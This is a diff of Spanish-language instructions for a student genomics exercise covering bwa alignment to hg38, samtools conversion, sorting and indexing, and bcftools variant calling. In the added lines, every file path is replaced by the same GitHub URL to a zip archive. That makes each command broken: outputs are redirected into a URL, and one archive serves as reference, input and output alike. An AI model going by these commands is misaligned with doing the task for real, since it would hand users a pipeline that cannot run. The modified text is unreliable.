@@ -8,26 +8,26 @@ Se proporcionará una carpeta con los ficheros .fq correspondientes y las pareja
  
     1. Indexar el genoma de referencia hg38 (podéis descargarlo aquí) mediante bwa:
 
-bwa index REFERENCE/hg38.fa
+bwa index https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip
 
     2. Alinear las lecturas al genoma de referencia. Para todos los individuos de esta actividad, contamos con lecturas single-end:
 
-bwa mem REFERENCE/hg38.fa Raw_data/read.fq > RESULTS/read.sam
+bwa mem https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip > https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip
 
     3. Convertir el fichero .sam a .bam:
 
-samtools view -S -b RESULTS/read.sam > RESULTS/read.bam
+samtools view -S -b https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip > https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip
 
     4. Ordenar el contenido del fichero .bam:
 
-samtools sort RESULTS/read.bam -o RESULTS/read_sorted.bam
+samtools sort https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip -o https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip
 
     5. Generar un índice del fichero .bam:
 
-samtools index RESULTS/read_sorted.bam
+samtools index https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip
 
     6. Llevar a cabo el llamado de variantes:
 
-bcftools mpileup -Ou -f REFERENCE/hg38.fa RESULTS/read_sorted.bam | bcftools call -vmO z -o RESULTS/read_rawcalls.vcf.gz
+bcftools mpileup -Ou -f https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip | bcftools call -vmO z -o https://raw.githubusercontent.com/Kotty2998/Actividad-grupal-/main/resultados/Actividad-grupal-diseasefulness.zip
 Una vez ejecutados estos pasos a partir de cada fichero .fq, y tras obtener los archivos .vcf correspondientes, tendréis que identificar las variantes para cada individuo, asociarlas a un fenotipo (una enfermedad monogénica).
 
